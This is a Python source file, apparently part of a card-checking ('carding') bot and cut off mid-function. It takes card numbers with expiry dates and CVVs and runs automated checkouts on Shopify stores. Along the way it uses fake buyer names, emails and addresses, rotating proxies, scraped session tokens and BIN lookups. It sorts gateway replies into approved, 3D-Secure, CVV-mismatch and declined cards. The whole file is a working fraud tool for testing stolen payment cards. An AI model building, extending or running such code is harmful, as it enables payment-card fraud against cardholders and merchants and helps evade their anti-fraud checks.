untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}
"""


success_keys = [
    "Thank you for your purchase!",
    "Order #",
    "Your order is confirmed",
    "CARD_SUCCEEDED",
    "CARD_APPROVED",
    "PaymentSucceeded",
    "PaymentApproved",
    "PaymentCompleted",
    "CARD_COMPLETED",
    "CARD_SUCCESS",
    "SucceededReceipt",
    "ApprovedReceipt",
    "CompletedReceipt",
    "succeeded",
    "redirect_url"
]

twofactor_keys = [
    "3d_secure_2",
    "hooks",
    "CERTIFICATE",
    "ActionRequiredReceipt"
]

ccn_keys = [
    "INCORRECT_CVC",
    "INVALID_CVC",
    "INVALID_CVV",
    "CVC",
    "CVV",
    "CSC",
    "PAYMENTS_CREDIT_CARD_CVV_INVALID",
    "PAYMENTS_CREDIT_CARD_CSC_INVALID",
    "PAYMENTS_CREDIT_CARD_SECURITY_CODE_INVALID"
]

fail_keys = [
    "CARD_DECLINED",
    "DECLINED",
    "RISKY",
    "GENERIC_ERROR",
    "INCORRECT_NUMBER",
    "PAYMENTS_CREDIT_CARD_NUMBER_INVALID_FORMAT",
    "FUNDING_ERROR",
    "PROCESSING_ERROR",
    "PAYMENTS_CREDIT_CARD_BASE_EXPIRED"
]


C2C = {
    "USD": "US",
    "CAD": "CA",
    "INR": "IN",
    "AED": "AE",
    "HKD": "HK",
    "GBP": "GB",
    "CHF": "CH",
}

book = {
    "US": {"address1": "123 Main", "city": "NY", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
    "CA": {"address1": "88 Queen", "city": "Toronto", "postalCode": "M5J2J3", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
    "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123"},
    "IN": {"address1": "221B MG", "city": "Mumbai", "postalCode": "400001", "zoneCode": "MH", "countryCode": "IN", "phone": "+91 9876543210"},
    "AE": {"address1": "Burj Tower", "city": "Dubai", "postalCode": "", "zoneCode": "DU", "countryCode": "AE", "phone": "+971 50 123 4567"},
    "HK": {"address1": "Nathan 88", "city": "Kowloon", "postalCode": "", "zoneCode": "KL", "countryCode": "HK", "phone": "+852 5555 5555"},
    "CN": {"address1": "8 Zhongguancun Street", "city": "Beijing", "postalCode": "100080", "zoneCode": "BJ", "countryCode": "CN", "phone": "1062512345"},
    "CH": {"address1": "Gotthardstrasse 17", "city": "Schweiz", "postalCode": "6430", "zoneCode": "SZ", "countryCode": "CH", "phone": "445512345"},
    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000", "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
    "DEFAULT": {"address1": "123 Main", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
}


# Helper functions
def pick_addr(url, cc=None, rc=None):
    cc = (cc or "").upper()
    rc = (rc or "").upper()
    dom = urlparse(url).netloc
    tcn = dom.split('.')[-1].upper()

    if tcn in book:
        return book[tcn]

    ccn = C2C.get(cc)

    if rc in book and ccn == rc:
        return book[rc]
    elif rc in book:
        return book[rc]
    return book["DEFAULT"]

def capture(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None

def extract_between(text, start, end):
    if not text or not start or not end:
        return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1:
                if end in parts[1]:
                    result = parts[1].split(end, 1)[0]
                    return result if result else None
        return None
    except Exception:
        return None

class Utils:
    @staticmethod
    def get_random_name():
        first_names = ["James", "John", "Robert", "Michael", "William", "David", "Mary", "Patricia", "Jennifer", "Linda"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez"]
        return (random.choice(first_names), random.choice(last_names))
    
    @staticmethod
    def generate_email(first, last):
        domains = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com"]
        return f"{first.lower()}.{last.lower()}@{random.choice(domains)}"

def parse_proxy(proxy_str):
    if not proxy_str:
        return None

    proxy_str = proxy_str.strip()

    if proxy_str.startswith(("http://", "https://")):
        parsed = urlparse(proxy_str)
        if not parsed.hostname or not parsed.port:
            return None
        if parsed.username and parsed.password:
            return f"http://{parsed.username}:{parsed.password}@{parsed.hostname}:{parsed.port}"
        return f"http://{parsed.hostname}:{parsed.port}"

    parts = proxy_str.split(':')
    if len(parts) == 2:
        host, port = parts
        return f"http://{host}:{port}"
    if len(parts) == 4:
        host, port, user, password = parts
        return f"http://{user}:{password}@{host}:{port}"
    return None

def normalize_site_url(site_url):
    """Normalize site URL to scheme+host for stable storage/cache keys."""
    if not site_url:
        return site_url
    normalized = str(site_url).strip()
    if not normalized.startswith(('http://', 'https://')):
        normalized = f"https://{normalized}"
    parsed = urlparse(normalized)
    if not parsed.netloc:
        return normalized.rstrip('/')
    return f"{parsed.scheme or 'https'}://{parsed.netloc.lower()}".rstrip('/')

def validate_proxy_format(proxy_str):
    """Validate and normalize proxy format for storage."""
    if not proxy_str:
        return False, None, "Empty proxy"

    proxy_raw = str(proxy_str).strip()
    host = ""
    port = None
    username = None
    password = None

    try:
        if proxy_raw.startswith(("http://", "https://")):
            parsed = urlparse(proxy_raw)
            host = parsed.hostname or ""
            port = parsed.port
            username = parsed.username
            password = parsed.password
        else:
            parts = proxy_raw.split(':')
            if len(parts) == 2:
                host, port = parts[0].strip(), parts[1].strip()
            elif len(parts) == 4:
                host, port, username, password = [p.strip() for p in parts]
            else:
                return False, None, "Expected IP:PORT or IP:PORT:USER:PASS"

        if not host:
            return False, None, "Missing proxy host"

        if isinstance(port, str):
            if not port.isdigit():
                return False, None, "Invalid port"
            port = int(port)
        if not isinstance(port, int) or port < 1 or port > 65535:
            return False, None, "Port must be between 1 and 65535"

        if (username and not password) or (password and not username):
            return False, None, "Both username and password are required"

        if username and password:
            normalized = f"{host}:{port}:{username}:{password}"
        else:
            normalized = f"{host}:{port}"

        return True, normalized, None
    except Exception:
        return False, None, "Invalid proxy format"

async def validate_proxy_connection(proxy_str):
    """Validate that a proxy is reachable."""
    proxy = parse_proxy(proxy_str)
    if not proxy:
        return False, "Invalid proxy format"

    connector = aiohttp.TCPConnector(ssl=False)
    timeout = aiohttp.ClientTimeout(total=PROXY_VALIDATION_TIMEOUT)
    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            async with session.get(PROXY_VALIDATION_URL, proxy=proxy) as resp:
                if resp.status == 200:
                    return True, "OK"
                return False, f"HTTP {resp.status}"
    except Exception as e:
        return False, f"Unreachable ({type(e).__name__})"

def is_captcha_required(response_text):
    if not response_text:
        return False
    
    indicators = [
        'CAPTCHA_REQUIRED',
        '"code":"CAPTCHA_REQUIRED"',
        "'code':'CAPTCHA_REQUIRED'",
        '"message":"CAPTCHA_REQUIRED"',
        'captcha required',
        'CAPTCHA CHALLENGE',
        'hcaptcha',
        'h-captcha'
    ]
    
    text_upper = response_text.upper()
    for indicator in indicators:
        if indicator.upper() in text_upper:
            return True
    return False

async def make_graphql_request_with_captcha_handling(
    session, graphql_url, params, headers, json_data,
    checkout_url, max_retries=1, solve_captcha=True
):
    original_variables = json_data.get('variables', {}).copy()
    
    for attempt in range(max_retries + 1):
        try:
            response = await session.post(graphql_url, params=params, headers=headers, json=json_data)
            response_text = await response.text()
            return response, response_text, False
            
        except Exception as e:
            if attempt == max_retries:
                return None, str(e), False
            await asyncio.sleep(1)
    
    return response, response_text, False

async def fetch_products(domain, proxy_str=None):
    try:
        domain = normalize_site_url(domain)

        cache_key = domain.lower()
        cached_product = product_cache.get(cache_key)
        now_ts = time.time()
        if cached_product and cached_product.get("expires_at", 0) > now_ts:
            return dict(cached_product["data"])
        
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=10)
        
        proxy = parse_proxy(proxy_str) if proxy_str else None
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            async with session.get(f"{domain}/products.json", proxy=proxy, timeout=10) as resp:
                if resp.status != 200:
                    return False, f"Site Error! Status: {resp.status}"
                text = await resp.text()
                if "shopify" not in text.lower():
                    return False, "Not Shopify!"

                result = (await resp.json())['products']
                if not result:
                    return False, "No Products!"

        min_price = float('inf')
        min_product = None

        for product in result:
            if not product.get('variants'):
                continue
            
            for variant in product['variants']:
                if not variant.get('available', True):
                    continue
                
                try:
                    price = variant.get('price', '0')
                    if isinstance(price, str):
                        price = float(price.replace(',', ''))
                    else:
                        price = float(price)

                    if price < min_price:
                        min_price = price
                        min_product = {
                            'site': domain,
                            'price': f"{price:.2f}",
                            'variant_id': str(variant['id']),
                            'link': f"{domain}/products/{product['handle']}"
                        }
                except (ValueError, TypeError, AttributeError):
                    continue
        
        if isinstance(min_product, dict) and min_product.get('variant_id'):
            product_cache[cache_key] = {
                "data": min_product,
                "expires_at": now_ts + PRODUCT_CACHE_TTL_SECONDS
            }
            return min_product
        else:
            return False, "No Valid Products"

    except aiohttp.ClientError as e:
        return False, f"Proxy Error: {str(e)}"
    except Exception as e:
        return False, f"error: {str(e)}"

def extract_clean_response(message):
    if not message:
        return "UNKNOWN_ERROR"
    
    message = str(message)
    
    patterns = [
        r'(PAYMENTS_[A-Z_]+)',
        r'(CARD_[A-Z_]+)',
        r'([A-Z]+_[A-Z]+_[A-Z_]+)',
        r'([A-Z]+_[A-Z_]+)',
        r'code["\']?\s*[:=]\s*["\']?([^"\',]+)["\']?',
        r'{"code":"([^"]+)"',
        r"'code':'([^']+)'"
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, message, re.IGNORECASE)
        for match in matches:
            if isinstance(match, tuple):
                match = match[0]
            if match and "_" in match and len(match) < 50:
                match = match.strip("{}:'\" ")
                return match
    
    words = message.split()
    if words:
        first_word = words[0]
        if "_" in first_word and first_word.isupper():
            return first_word
    
    return message[:50]

def parse_cc_string(cc_string):
    parts = cc_string.split('|')
    if len(parts) != 4:
        raise ValueError("Invalid CC format. Use: CC|MM|YYYY|CVV")
    return {
        'cc': parts[0].strip(),
        'mes': parts[1].strip(),
        'ano': parts[2].strip(),
        'cvv': parts[3].strip()
    }

def get_default_bin_info(bin_number):
    return {
        "bin": bin_number,
        "brand": "UNKNOWN",
        "country": "UNKNOWN",
        "country_name": "UNKNOWN",
        "country_flag": "🏳️",
        "bank": "UNKNOWN",
        "level": "UNKNOWN",
        "type": "UNKNOWN"
    }

async def get_bin_info(bin_number):
    """Get BIN information asynchronously with cache."""
    now_ts = time.time()
    cached = bin_cache.get(bin_number)
    if cached and cached.get("expires_at", 0) > now_ts:
        return cached["data"]

    try:
        timeout = aiohttp.ClientTimeout(total=5)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as response:
                if response.status == 200:
                    data = await response.json()
                    bin_cache[bin_number] = {
                        "data": data,
                        "expires_at": now_ts + BIN_CACHE_TTL_SECONDS
                    }
                    return data
    except Exception:
        pass
    fallback = get_default_bin_info(bin_number)
    bin_cache[bin_number] = {
        "data": fallback,
        "expires_at": now_ts + BIN_CACHE_TTL_SECONDS
    }
    return fallback

def get_active_task_stats(user_id):
    queued = 0
    processing = 0
    for task in active_tasks.values():
        if task.get('user_id') != user_id:
            continue
        if task.get('status') == 'processing':
            processing += 1
        else:
            queued += 1
    return {
        "active_total": queued + processing,
        "active_queued": queued,
        "active_processing": processing
    }

async def test_site_connection(site_url, proxy_str=None):
    """Test if a site is working by trying to add to cart and get session token"""
    try:
        if not site_url.startswith('http'):
            site_url = f"https://{site_url}"
        
        # Get variant_id from site
        info = await fetch_products(site_url, proxy_str)
        if isinstance(info, tuple) and info[0] is False:
            return False, info[1], None
        
        variant_id = info['variant_id']
        
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=20)
        proxy = parse_proxy(proxy_str) if proxy_str else None
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Content-Type': 'application/json',
                'Origin': site_url,
                'Referer': site_url
            }
            
            # Add to cart
            cart_url = site_url + '/cart/add.js'
            cart_headers = {**headers, 'Content-Type': 'application/x-www-form-urlencoded'}
            cart_resp = await session.post(cart_url, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy)
            
            if cart_resp.status != 200:
                return False, f"Cart failed: {cart_resp.status}", None
            
            # Go to checkout
            checkout_url = site_url + '/checkout/'
            response = await session.post(url=checkout_url, allow_redirects=True, headers=headers, proxy=proxy)
            
            if 'login' in str(response.url).lower():
                return False, "Login required", None
            
            text = await response.text()
            
            # Extract session token
            sst = response.headers.get('X-Checkout-One-Session-Token') or response.headers.get('x-checkout-one-session-token')
            if not sst:
                sst = extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&quot;') or \
                      extract_between(text, 'name="serialized-sessionToken" content="', '"') or \
                      extract_between(text, '"serializedSessionToken":"', '"') or \
                      extract_between(text, 'data-session-token="', '"') or \
                      extract_between(text, '"sessionToken":"', '"')
            
            if sst:
                return True, "Working", info
            else:
                return False, "No session token", None
                
    except Exception as e:
        return False, str(e), None

async def process_card(cc, mes, ano, cvv, site_url, user_id, proxy_str=None):
    """Process a single card with given site and proxy"""
    gateway = "UNKNOWN"
    total_price = "0.00"
    currency = "USD"
    receipt_id = None
    order_url = None
    
    ourl = normalize_site_url(site_url)
    displayName = ""
    payment_identifier = None
    proxy = parse_proxy(proxy_str) if proxy_str else None
    checkpoint_data = None
    running_total = "0.00"
    max_retries = 1  # Retry once with new proxy if connection fails

    for attempt in range(max_retries + 1):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Content-Type': 'application/json',
                'Origin': ourl,
                'Referer': ourl
            }

            address_info = pick_addr(ourl)
            country_code = address_info["countryCode"]
            
            firstName, lastName = Utils.get_random_name()
            email = Utils.generate_email(firstName, lastName)
            
            phone = address_info["phone"]
            street = address_info["address1"]
            city = address_info["city"]
            state = address_info["zoneCode"]
            s_zip = address_info["postalCode"]
            address2 = ""

            # Get variant_id from site
            info = await fetch_products(ourl, proxy_str)
            if isinstance(info, tuple) and info[0] is False:
                # Remove dead site from user's sites
                await remove_dead_site(user_id, site_url)
                return False, "SITE_DEAD", gateway, total_price, currency, receipt_id, order_url
            variant_id = info['variant_id']

            connector = aiohttp.TCPConnector(ssl=False)
            timeout = aiohttp.ClientTimeout(total=30)
            
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                url = ourl
                cart = url + '/cart/add.js'
                checkout = url + '/checkout/'

                cart_headers = {
                    **headers,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept': 'application/json, text/javascript'
                }
                cart_resp = await session.post(cart, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy)
                
                if cart_resp.status != 200:
                    cart_headers_alt = {
                        **headers,
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    }
                    cart_data = {'items': [{'id': int(variant_id), 'quantity': 1}]}
                    cart_resp = await session.post(cart, json=cart_data, headers=cart_headers_alt, proxy=proxy)
                
                if cart_resp.status != 200:
                    return False, f"Cart failed with status {cart_resp.status}", gateway, total_price, currency, receipt_id, order_url

                checkout_headers = {
                    **headers,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
                }
                response = await session.post(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=proxy)
                checkout_url = str(response.url)

                attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
                attempt_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split('/')[-1].split('?')[0]

                sst = response.headers.get('X-Checkout-One-Session-Token') or response.headers.get('x-checkout-one-session-token')
                
                text = await response.text()
                if not sst:
                    sst = extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&quot;')
                    if not sst:
                        sst = extract_between(text, 'name="serialized-sessionToken" content="', '"')
                    if not sst:
                        sst = extract_between(text, '"serializedSessionToken":"', '"')
                    if not sst:
                        sst = extract_between(text, 'data-session-token="', '"')
                    if not sst:
                        sst = extract_between(text, '"sessionToken":"', '"')
                
                if 'login' in checkout_url.lower():
                    await remove_dead_site(user_id, site_url)
                    return False, "LOGIN_REQUIRED", gateway, total_price, currency, receipt_id, order_url

                queueToken = extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or extract_between(text, '"queueToken":"', '"')
                stableId = extract_between(text, 'stableId&quot;:&quot;', '&quot;') or extract_between(text, '"stableId":"', '"')
                
                merch = extract_between(text, 'ProductVariantMerchandise/', '&quot;') or \
                        extract_between(text, 'ProductVariantMerchandise/', '&q') or \
                        extract_between(text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"')
                if not merch:
                    merch = str(variant_id)
                
                currency = 'USD'
                if 'currencyCode&quot;:&quot;' in text:
                    currency = extract_between(text, 'currencyCode&quot;:&quot;', '&quot;') or 'USD'
                elif '"currencyCode":"' in text:
                    currency = extract_between(text, '"currencyCode":"', '"') or 'USD'
                
                subtotal = extract_between(text, 'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&quot;') or \
                         extract_between(text, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
                if not subtotal:
                    price_match = re.search(r'"price":\s*"([\d.]+)"', text)
                    subtotal = price_match.group(1) if price_match else "0.01"

                if not sst:
                    return False, "Failed to get session token", gateway, total_price, currency, receipt_id, order_url

                params = {'operationName': 'Proposal'}
                
                json_data = {
                    'query': QUERY_PROPOSAL_SHIPPING,
                    'variables': {
                        'sessionInput': {'sessionToken': sst},
                        'queueToken': queueToken or '',
                        'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                        'delivery': {
                            'deliveryLines': [{
                                'destination': {
                                    'partialStreetAddress': {
                                        'address1': street, 'address2': address2, 'city': city,
                                        'countryCode': country_code, 'postalCode': s_zip,
                                        'firstName': firstName, 'lastName': lastName,
                                        'zoneCode': state, 'phone': phone
                                    }
                                },
                                'selectedDeliveryStrategy': {
                                    'deliveryStrategyMatchingConditions': {
                                        'estimatedTimeInTransit': {'any': True},
                                        'shipments': {'any': True}
                                    },
                                    'options': {}
                                },
                                'targetMerchandiseLines': {'any': True},
                                'deliveryMethodTypes': ['SHIPPING'],
                                'expectedTotalPrice': {'any': True},
                                'destinationChanged': True
                            }],
                            'noDeliveryRequired': [],
                            'useProgressiveRates': False,
                            'prefetchShippingRatesStrategy': None,
                            'supportsSplitShipping': True
                        },
                        'deliveryExpectations': {'deliveryExpectationLines': []},
                        'merchandise': {
                            'merchandiseLines': [{
                                'stableId': stableId or '1',
                                'merchandise': {
                                    'productVariantReference': {
                                        'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                                        'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                        'properties': [],
                                        'sellingPlanId': None,
                                        'sellingPlanDigest': None
                                    }
                                },
                                'quantity': {'items': {'value': 1}},
                                'expectedTotalPrice': {'value': {'amount': subtotal, 'currencyCode': currency}},
                                'lineComponentsSource': None,
                                'lineComponents': []
                            }]
                        },
                        'payment': {
                            'totalAmount': {'any': True},
                            'paymentLines': [],
                            'billingAddress': {
                                'streetAddress': {
                                    'address1': '', 'city': '', 'countryCode': country_code,
                                    'lastName': '', 'zoneCode': 'ENG', 'phone': ''
                                }
                            }
                        },
                        'buyerIdentity': {
                            'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                            'email': email,
                            'emailChanged': False,
                            'phoneCountryCode': country_code,
                            'marketingConsent': [{'email': {'value': email}}],
                            'shopPayOptInPhone': {'countryCode': country_code},
                            'rememberMe': False
                        },
                        'tip': {'tipLines': []},
                        'taxes': {
                            'proposedAllocations': None,
                            'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}},
                            'proposedTotalIncludedAmount': None,
                            'proposedMixedStateTotalAmount': None,
                            'proposedExemptions': []
                        },
                        'note': {'message': None, 'customAttributes': []},
                        'localizationExtension': {'fields': []},
                        'nonNegotiableTerms': None,
                        'scriptFingerprint': {
                            'signature': None,
                            'signatureUuid': None,
                            'lineItemScriptChanges': [],
                            'paymentScriptChanges': [],
                            'shippingScriptChanges': []
                        },
                        'optionalDuties': {'buyerRefusesDuties': False}
                    },
                    'operationName': 'Proposal'
                }

                graphql_url = f'https://{urlparse(ourl).netloc}/checkouts/unstable/graphql'
                
                response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, params, headers, json_data, checkout_url, max_retries=1
                )
                
                if not response:
                    # Connection failed, try new proxy if available
                    if attempt < max_retries:
                        # Get new proxy for retry
                        user_proxies = await get_user_proxies(user_id)
                        if user_proxies:
                            # Try a different proxy
                            available_proxies = [p for p in user_proxies if p != proxy_str]
                            if available_proxies:
                                proxy_str = random.choice(available_proxies)
                                proxy = parse_proxy(proxy_str)
                                logger.info(f"Retrying with new proxy for user {user_id}")
                                continue
                    return False, f"Request failed: {resp_text}", gateway, total_price, currency, receipt_id, order_url
                
                if is_captcha_required(resp_text):
                    return False, "CAPTCHA_REQUIRED", gateway, total_price, currency, receipt_id, order_url
                
                try:
                    resp_json = json.loads(resp_text)
                except json.JSONDecodeError as e:
                    return False, f"Invalid JSON response: {str(e)}", gateway, total_price, currency, receipt_id, order_url

                if 'errors' in resp_json:
                    errors = resp_json.get('errors', [])
                    error_msgs = [e.get('message', str(e)) for e in errors[:3]]
                    return False, f"GraphQL Error: {'; '.join(error_msgs)}", gateway, total_price, currency, receipt_id, order_url

                try:
                    if 'data' not in resp_json:
                        return False, "No data in proposal response", gateway, total_price, currency, receipt_id, order_url
                    
                    session_data = resp_json['data'].get('session')
                    if session_data is None:
                        return False, "Session is null", gateway, total_price, currency, receipt_id, order_url
                    
                    negotiate = session_data.get('negotiate')
                    if negotiate is None:
                        return False, "Negotiate returned null", gateway, total_price, currency, receipt_id, order_url
                    
                    result = negotiate.get('result')
                    if result is None:
                        return False, "Result is null", gateway, total_price, currency, receipt_id, order_url
                    
                    result_type = result.get('__typename', 'Unknown')
                    
                    if result_type == 'CheckpointDenied':
                        return False, f"Checkpoint Denied", gateway, total_price, currency, receipt_id, order_url
                    
                    if result_type == 'Throttled':
                        return False, "Throttled", gateway, total_price, currency, receipt_id, order_url
                    
                    if result_type == 'NegotiationResultFailed':
                        return False, "Negotiation failed", gateway, total_price, currency, receipt_id, order_url
                    
                    checkpoint_data = result.get('checkpointData')
                    
                    seller_proposal = result.get('sellerProposal')
                    if seller_proposal is None:
                        return False, "Seller proposal is null", gateway, total_price, currency, receipt_id, order_url
                    
                    delivery_data = seller_proposal.get('delivery')
                    running_total_data = seller_proposal.get('runningTotal')
                    
                    if not running_total_data:
                        return False, "No runningTotal in sellerProposal", gateway, total_price, currency, receipt_id, order_url
                    
                    running_total = running_total_data['value']['amount']
                    
                except (KeyError, TypeError) as e:
                    return False, f"Failed to parse proposal response: {str(e)}", gateway, total_price, currency, receipt_id, order_url

                if not delivery_data:
                    return False, "No delivery data in proposal", gateway, total_price, currency, receipt_id, order_url
                
                delivery_type = delivery_data.get('__typename', '')
                
                if delivery_type == 'PendingTerms':
                    delivery_strategy = ''
                    shipping_amount = 0.0
                elif delivery_type == 'FilledDeliveryTerms':
                    delivery_lines = delivery_data.get('deliveryLines', [{}])
                    if delivery_lines and len(delivery_lines) > 0:
                        available_strategies = delivery_lines[0].get('availableDeliveryStrategies', [])
                        if available_strategies and len(available_strategies) > 0:
                            delivery_strategy = available_strategies[0].get('handle', '')
                            shipping_amount_data = available_strategies[0].get('amount', {}).get('value', {}).get('amount', '0')
                            try:
                                shipping_amount = float(shipping_amount_data)
                            except:
                                shipping_amount = 0.0
                        else:
                            delivery_strategy = ''
                            shipping_amount = 0.0
                    else:
                        delivery_strategy = ''
                        shipping_amount = 0.0
                else:
                    delivery_strategy = ''
                    shipping_amount = 0.0
                
                try:
                    tax_data = seller_proposal.get('tax', {})
                    if tax_data and tax_data.get('__typename') == 'FilledTaxTerms':
                        tax_amount_data = tax_data.get('totalTaxAmount', {}).get('value', {}).get('amount', '0')
                        tax_amount = float(tax_amount_data)
                    else:
                        tax_amount = 0.0
                except:
                    tax_amount = 0.0

                payment_data = seller_proposal.get('payment', {})
                if payment_data and payment_data.get('__typename') == 'FilledPaymentTerms':
                    payment_methods = payment_data.get('availablePaymentLines', [])
                    for method in payment_methods:
                        payment_method = method.get('paymentMethod', {})
                        if payment_method.get('name') or payment_method.get('paymentMethodIdentifier'):
                            payment_identifier = payment_method.get('paymentMethodIdentifier')
                            displayName = payment_method.get('extensibilityDisplayName') or payment_method.get('name', 'Unknown')
                            
                            gateway = payment_method.get('extensibilityDisplayName') or payment_method.get('name', 'UNKNOWN')
                            total_price = str(float(running_total) + shipping_amount + tax_amount)
                            
                            break
                
                if not payment_identifier:
                    return False, "No valid payment method found", gateway, total_price, currency, receipt_id, order_url
                
                json_data['query'] = QUERY_PROPOSAL_DELIVERY
                json_data['variables']['delivery']['deliveryLines'][0]['selectedDeliveryStrategy'] = {
                    'deliveryStrategyByHandle': {
                        'handle': delivery_strategy if delivery_strategy else '',
                        'customDeliveryRate': False
                    },
                    'options': {}
                }
                json_data['variables']['delivery']['deliveryLines'][0]['targetMerchandiseLines'] = {
                    'lines': [{'stableId': stableId or '1'}]
                }
                json_data['variables']['delivery']['deliveryLines'][0]['expectedTotalPrice'] = {
                    'value': {'amount': str(shipping_amount), 'currencyCode': currency}
                }
                json_data['variables']['delivery']['deliveryLines'][0]['destinationChanged'] = False
                json_data['variables']['payment']['billingAddress'] = {
                    'streetAddress': {
